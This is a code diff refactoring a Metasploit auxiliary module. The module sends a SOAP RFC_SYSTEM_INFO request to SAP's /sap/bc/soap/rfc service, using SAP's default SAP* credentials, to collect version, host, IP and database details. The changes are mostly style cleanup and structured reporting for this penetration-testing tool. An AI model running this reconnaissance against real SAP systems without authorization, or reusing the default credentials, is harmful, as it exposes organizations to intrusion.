@@ -27,51 +27,57 @@ class MetasploitModule < Msf::Auxiliary
         system version, SAP version, IP address and other information through the use of
         the /sap/bc/soap/rfc SOAP service.
       },
-      'References' =>
-        [
-          [ 'CVE', '2006-6010' ],
-          [ 'URL', 'https://labs.f-secure.com/tools/sap-metasploit-modules/' ]
-        ],
-      'Author' =>
-        [
-          'Agnivesh Sathasivam',
-          'nmonkee',
-          'ChrisJohnRiley' # module cleanup / streamlining
-        ],
-      'License' => MSF_LICENSE
-      )
+      'References' => [
+        [ 'CVE', '2006-6010' ],
+        [ 'URL', 'https://labs.f-secure.com/tools/sap-metasploit-modules/' ]
+      ],
+      'Author' => [
+        'Agnivesh Sathasivam',
+        'nmonkee',
+        'ChrisJohnRiley' # module cleanup / streamlining
+      ],
+      'License' => MSF_LICENSE,
+      'Notes' => {
+        'Stability' => [CRASH_SAFE],
+        'SideEffects' => [],
+        'Reliability' => []
+      }
+    )
     register_options(
       [
         Opt::RPORT(8000),
         OptString.new('CLIENT', [true, 'SAP Client ', '001']),
         OptString.new('HttpUsername', [true, 'Username', 'SAP*']),
         OptString.new('HttpPassword', [true, 'Password', '06071992']),
-      ])
+      ]
+    )
   end
 
   def extract_field(data, elem)
-    if data =~ /<#{elem}>([^<]+)<\/#{elem}>/i
-      return $1
+    if data =~ %r{<#{elem}>([^<]+)</#{elem}>}i
+      return ::Regexp.last_match(1)
     end
+
     nil
   end
 
-  def report_note_sap(type, data, value)
+  def report_note_sap(type, data, key, value)
     # create note
     report_note(
-      :host => rhost,
-      :port => rport,
-      :proto => 'tcp',
-      :sname => 'sap',
-      :type => type,
-      :data => data + value
-    ) if data
+      host: rhost,
+      port: rport,
+      proto: 'tcp',
+      sname: 'sap',
+      type: type,
+      data: { key => value, info: data + value }
+    )
     # update saptbl for output
     @saptbl << [ data, value ]
   end
 
   def run_host(ip)
     client = datastore['CLIENT']
+
     data = '<?xml version="1.0" encoding="utf-8" ?>'
     data << '<env:Envelope xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:env="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">'
     data << '<env:Body>'
@@ -83,29 +89,30 @@ class MetasploitModule < Msf::Auxiliary
     data << '</n1:RFC_SYSTEM_INFO>'
     data << '</env:Body>'
     data << '</env:Envelope>'
+
     print_status("[SAP] #{ip}:#{rport} - sending SOAP RFC_SYSTEM_INFO request")
     begin
       res = send_request_cgi({
         'uri' => '/sap/bc/soap/rfc',
         'method' => 'POST',
         'data' => data,
-        'cookie' => "sap-usercontext=sap-language=EN&sap-client=#{datastore['CLIENT']}",
+        'cookie' => "sap-usercontext=sap-language=EN&sap-client=#{client}",
         'ctype' => 'text/xml; charset=UTF-8',
         'encode_params' => false,
         'authorization' => basic_auth(datastore['HttpUsername'], datastore['HttpPassword']),
-        'headers' =>{
-          'SOAPAction' => 'urn:sap-com:document:sap:rfc:functions',
+        'headers' => {
+          'SOAPAction' => 'urn:sap-com:document:sap:rfc:functions'
         },
         'vars_get' => {
-          'sap-client'    => datastore['CLIENT'],
-          'sap-language'  => 'EN'
+          'sap-client' => client,
+          'sap-language' => 'EN'
         }
       })
-      if res and res.code != 500 and res.code != 200
+      if res && (res.code != 500) && (res.code != 200)
         # to do - implement error handlers for each status code, 404, 301, etc.
         print_error("[SAP] #{ip}:#{rport} - something went wrong!")
         return
-      elsif not res
+      elsif !res
         print_error("[SAP] #{ip}:#{rport} - Server did not respond")
         return
       end
@@ -119,11 +126,11 @@ class MetasploitModule < Msf::Auxiliary
     # create table for output
     @saptbl = Msf::Ui::Console::Table.new(
       Msf::Ui::Console::Table::Style::Default,
-      'Header' => "[SAP] SOAP RFC_SYSTEM_INFO",
+      'Header' => '[SAP] SOAP RFC_SYSTEM_INFO',
       'Prefix' => "\n",
       'Postfix' => "\n",
       'Indent' => 1,
-      'Columns' =>[ "Key", "Value" ]
+      'Columns' => [ 'Key', 'Value' ]
     )
 
     response = res.body
@@ -148,36 +155,35 @@ class MetasploitModule < Msf::Auxiliary
     rfcipv6addr = extract_field(response, 'rfcipv6addr')
 
     # report notes / create saptbl output
-    report_note_sap('sap.version.release','Release Status of SAP System: ',rfcsaprl) if rfcsaprl
-    report_note_sap('sap.version.rfc_log','RFC Log Version: ',rfcproto) if rfcproto
-    report_note_sap('sap.version.kernel','Kernel Release: ',rfckernrl) if rfckernrl
-    report_note_sap('system.os','Operating System: ',rfcopsys) if rfcopsys
-    report_note_sap('sap.db.hostname','Database Host: ',rfcdbhost) if rfcdbhost
-    report_note_sap('sap.db_system','Central Database System: ',rfcdbsys) if rfcdbsys
-    report_note_sap('system.hostname','Hostname: ',rfchost) if rfchost
-    report_note_sap('system.ip.v4','IPv4 Address: ',rfcipaddr) if rfcipaddr
-    report_note_sap('system.ip.v6','IPv6 Address: ',rfcipv6addr) if rfcipv6addr
-    report_note_sap('sap.instance','System ID: ',rfcsysid) if rfcsysid
-    report_note_sap('sap.rfc.destination','RFC Destination: ',rfcdest) if rfcdest
-    report_note_sap('system.timezone','Timezone (diff from UTC in seconds): ',rfctzone.gsub(/\s+/, "")) if rfctzone
-    report_note_sap('system.charset','Character Set: ',rfcchartyp) if rfcchartyp
-    report_note_sap('sap.daylight_saving_time','Daylight Saving Time: ',rfcdayst) if rfcdayst
-    report_note_sap('sap.machine_id','Machine ID: ',rfcmach.gsub(/\s+/,"")) if rfcmach
+    report_note_sap('sap.version.release', 'Release Status of SAP System: ', :sap_system_release_status, rfcsaprl) if rfcsaprl
+    report_note_sap('sap.version.rfc_log', 'RFC Log Version: ', :rfc_log_version, rfcproto) if rfcproto
+    report_note_sap('sap.version.kernel', 'Kernel Release: ', :kernel_release, rfckernrl) if rfckernrl
+    report_note_sap('system.os', 'Operating System: ', :operating_system, rfcopsys) if rfcopsys
+    report_note_sap('sap.db.hostname', 'Database Host: ', :database_hostname, rfcdbhost) if rfcdbhost
+    report_note_sap('sap.db_system', 'Central Database System: ', :db_system, rfcdbsys) if rfcdbsys
+    report_note_sap('system.hostname', 'Hostname: ', :hostname, rfchost) if rfchost
+    report_note_sap('system.ip.v4', 'IPv4 Address: ', :ipv4_address, rfcipaddr) if rfcipaddr
+    report_note_sap('system.ip.v6', 'IPv6 Address: ', :ipv6_address, rfcipv6addr) if rfcipv6addr
+    report_note_sap('sap.instance', 'System ID: ', :system_id, rfcsysid) if rfcsysid
+    report_note_sap('sap.rfc.destination', 'RFC Destination: ', :rfc_destination, rfcdest) if rfcdest
+    report_note_sap('system.timezone', 'Timezone (diff from UTC in seconds): ', :timezone, rfctzone.gsub(/\s+/, '')) if rfctzone
+    report_note_sap('system.charset', 'Character Set: ', :character_set, rfcchartyp) if rfcchartyp
+    report_note_sap('sap.daylight_saving_time', 'Daylight Saving Time: ', :daylight_savings_time, rfcdayst) if rfcdayst
+    report_note_sap('sap.machine_id', 'Machine ID: ', :machine_id, rfcmach.gsub(/\s+/, '')) if rfcmach
 
     if rfcinttyp == 'LIT'
-      report_note_sap('system.endianness','Integer Format: ', 'Little Endian')
+      report_note_sap('system.endianness', 'Integer Format: ', :integer_format, 'Little Endian')
     elsif rfcinttyp
-      report_note_sap('system.endianness','Integer Format: ', 'Big Endian')
+      report_note_sap('system.endianness', 'Integer Format: ', :integer_format, 'Big Endian')
     end
 
     if rfcflotyp == 'IE3'
-      report_note_sap('system.float_type','Float Type Format: ', 'IEEE')
+      report_note_sap('system.float_type', 'Float Type Format: ', :float_format, 'IEEE')
     elsif rfcflotyp
-      report_note_sap('system.float_type','Float Type Format: ', 'IBM/370')
+      report_note_sap('system.float_type', 'Float Type Format: ', :float_format, 'IBM/370')
     end
 
     # output table
-    print(@saptbl.to_s)
-
+    print(@saptbl)
   end
 end
